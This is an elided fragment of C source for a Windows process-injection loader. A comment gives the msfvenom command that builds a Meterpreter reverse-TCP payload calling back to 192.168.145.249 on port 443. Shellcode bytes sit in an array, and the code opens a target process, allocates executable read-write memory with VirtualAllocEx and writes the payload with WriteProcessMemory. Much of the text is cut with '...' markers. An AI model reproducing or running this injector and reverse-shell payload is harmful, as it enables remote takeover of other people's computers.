...
int main() {
	...
	//msfvenom --platform windows --arch x64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.145.249 LPORT=443 EXITFUNC=thread -f c --var-name=something
	...
	unsigned char something[] =
		...
		"\x89\xe5\x49\xbc\x02\x00\x01\xbb\xc0\xa8\x91\xf9\x41\x54"
	...
	/*unsigned char something[] =
		...
		"\x77\x26\x07\xff\xd5\x49\xc7\xc1\x30\x00\x00\x00\xe8\x08"
		"\x00\x00\x00\x48\x65\x6c\x6c\x6f\x21\x20\x00\x5a\xe8\x09"
		"\x00\x00\x00\x49\x6e\x6a\x65\x63\x74\x65\x64\x00\x41\x58"
	...
	if (hProcess == NULL) {
		printf("%s couldnt get a handle of the process (%ld), error: %ld", e, PID, GetLastError());
		return EXIT_FAILURE;
	}

	printf("%s got a handle to the process!\n", k, hProcess);

	rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(something), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	printf("%s allocated %zu-bytes with PAGE_EXECUTE_READWRITE permissions", k, sizeof(something));

	WriteProcessMemory(hProcess, rBuffer, something, sizeof(something), NULL);
